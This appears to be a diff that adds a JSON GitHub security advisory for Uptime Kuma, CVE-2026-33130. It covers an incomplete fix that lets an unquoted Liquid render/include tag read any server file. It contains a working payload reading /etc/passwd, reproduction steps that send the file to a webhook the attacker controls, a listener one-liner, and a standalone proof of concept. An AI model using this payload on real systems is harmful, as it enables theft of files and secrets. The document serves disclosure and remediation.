@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-v832-4r73-wx5j",
+  "repo": {
+    "cve_id": "CVE-2026-33130",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-1336",
+      "CWE-98"
+    ],
+    "description": "# Incomplete fix for GHSA-vffh-c9pq-4crh\r\n\r\n**Version:** 2.1.3, LiquidJS 10.24.0\r\n**Related:** GHSA-vffh-c9pq-4crh (marked patched in 2.0.0)\r\n\r\n## What's happening\r\n\r\nThe fix from GHSA-vffh-c9pq-4crh doesn't fully work. The three mitigations added to the Liquid engine (`root`, `relativeReference`, `dynamicPartials`) only block quoted paths. If you use an unquoted absolute path, you can still read any file on the server:\r\n\r\n```\r\n{% render /etc/passwd %}\r\n```\r\n\r\nI reproduced this end-to-end on 2.1.3 and still got the full `/etc/passwd` contents sent to a webhook endpoint.\r\n\r\n## Why the current fix doesn't work\r\n\r\nThe mitigations in `notification-provider.js` are:\r\n\r\n```javascript\r\nconst engine = new Liquid({\r\n    root: \"./no-such-directory-uptime-kuma\",\r\n    relativeReference: false,\r\n    dynamicPartials: false,\r\n});\r\n```\r\n\r\nThese only protect the first two steps of LiquidJS's file resolution. There's a third step, a `require.resolve()` fallback at `liquid.node.js:2793-2796`, that has **no containment check at all**:\r\n\r\n```javascript\r\n// liquid.node.js line 2793-2796\r\nif (fs.fallback !== undefined) {\r\n    const filepath = fs.fallback(file);  // calls require.resolve(), no contains() check\r\n    if (filepath !== undefined)\r\n        yield filepath;\r\n}\r\n```\r\n\r\nThe reason quoted paths are blocked is just a quirk: `readFileNameTemplate()` keeps the literal quote characters, so `require.resolve('\"/etc/passwd\"')` fails with `MODULE_NOT_FOUND`. Without quotes, `require.resolve('/etc/passwd')` happily returns the real path.\r\n\r\n## Who can exploit this\r\n\r\nAny authenticated user since there's no RBAC in Uptime Kuma. The notification handlers only call `checkLogin(socket)`, so any compromised login can set up a malicious template.\r\n\r\n## Steps to reproduce\r\n\r\n1. Log in to Uptime Kuma\r\n2. Go to any monitor → Edit → Set Up Notification\r\n3. Pick **Webhook**, set Post URL to an endpoint you control\r\n4. Change Request Body to **Custom Body**\r\n5. Enter: `{% render /etc/passwd %}`\r\n6. Click **Test**\r\n7. Check your listener > the full file contents are in the request body\r\n\r\nWorks with `{% include /etc/passwd %}` too. Any file readable by the Node process is fair game.\r\n\r\nFor a quick listener to catch the output:\r\n```bash\r\nnode -e \"require('http').createServer((req,res)=>{let b='';req.on('data',c=>b+=c);req.on('end',()=>{console.log(b);res.end('ok')})}).listen(9999)\"\r\n```\r\n\r\n## Standalone PoC (no running instance needed)\r\n\r\n```javascript\r\nconst { Liquid } = require(\"liquidjs\");\r\nconst engine = new Liquid({\r\n    root: \"./no-such-directory-uptime-kuma\",\r\n    relativeReference: false,\r\n    dynamicPartials: false,\r\n});\r\nengine.render(engine.parse(\"{% render /etc/passwd %}\"), {}).then(console.log);\r\n```\r\n\r\n## Suggested fix\r\n\r\nRemove the file-inclusion tags from the engine. Notification templates shouldn't need them:\r\n\r\n```javascript\r\nconst engine = new Liquid({ ... });\r\ndelete engine.tags[\"render\"];\r\ndelete engine.tags[\"include\"];\r\ndelete engine.tags[\"layout\"];\r\n```\r\n\r\nThis blocks the attack completely while keeping all normal template features (`{{ variables }}`, `{% if %}`, `{% for %}`, filters) working.\r\n\r\n## Timeline\r\n\r\n- **2025-10-20:** GHSA-vffh-c9pq-4crh published, 2.0.0 listed as patched\r\n- **2026-03-02:** Reproduced on 2.1.3 > the fix is incomplete, unquoted paths bypass everything\r\n",
+    "ghsa_id": "GHSA-v832-4r73-wx5j",
+    "html_url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v832-4r73-wx5j",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v832-4r73-wx5j"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-33130"
+      }
+    ],
+    "published_at": "2026-03-16T05:46:42Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Another Server-side Template Injection (SSTI) in Notification Templates Allows Arbitrary File Read",
+    "updated_at": "2026-03-17T21:53:53Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "uptime-kuma"
+        },
+        "patched_versions": "2.2.1",
+        "vulnerable_version_range": ">= 1.23.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "louislam/uptime-kuma"
+}
